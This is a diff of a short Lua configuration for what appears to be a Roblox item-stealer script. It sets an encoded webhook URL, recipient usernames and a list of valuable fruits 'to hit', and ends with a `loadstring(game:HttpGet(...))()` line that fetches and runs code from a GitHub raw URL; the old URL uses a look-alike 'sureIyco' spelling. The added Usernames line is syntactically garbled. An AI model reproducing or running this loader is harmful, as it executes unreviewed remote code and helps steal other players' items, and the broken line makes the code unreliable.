@@ -1,5 +1,6 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=SHJlVms1dG16TWtuVV9rZC1rSjNFZzpaZ0FGbVNGNk02Y1QtRkJyeGg5Smx5djNWeW1RWE9va3QzNjNFMEl5MmE0R0NvNGdhdGZkNW1GTTNYdUtzSmtTZ3ptQ3Z5Sm9OQlAwNXk3YmhjeHE0bzBsN3NxVGlUNXpWZXlURHBJTEdaZjVSQ1FyNi1TVUtqRkdwRGFjWWVTMEVhU1hxZE5ha3NlNnVSMzB3U1o1RzhLMTg3d3VGSnVfZXFEeUN6dXdyOWc"
-Usernames = {"U_DGmECI"}
-FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Spirit-Spirit", "Gas-Gas", "Gravity-Gravity", "Portal-Portal", "Buddha-Buddha"}
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sureIyco/CutestCodes/refs/heads/main/V2"))()
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=UzdDajJ1MGMzUFoxQnptNjNidmJMUTp6Szd6dENvejg4aVBRcHF4TFgzLWY2ZDJ6WHM0clRZNVVtVWNhTklNQno3YjlQc3FnMFpja1Z4OXdQNWZ2R0gwVUkyZl9MN2JvQVhlbGZPRGc1cHpCTVFqNTlpRGJhaXFMSEtfSWlqUmR4d0tKSXZkbXdVQ3VFNXhseHpfMUltZVI5TjJKSHlLNjJnQTFnZWtmS3VhWFVrNy1JZnBDR0xrZnFjbUF1Q09xX2c"
+Usernames = {"{"U_DGmECI"}", "{"U_DGmECI"}"}
+FruitsToHit = {"Light-Light", "Diamond-Diamond", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Kitsune-Kitsune", "Yeti-Yeti"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
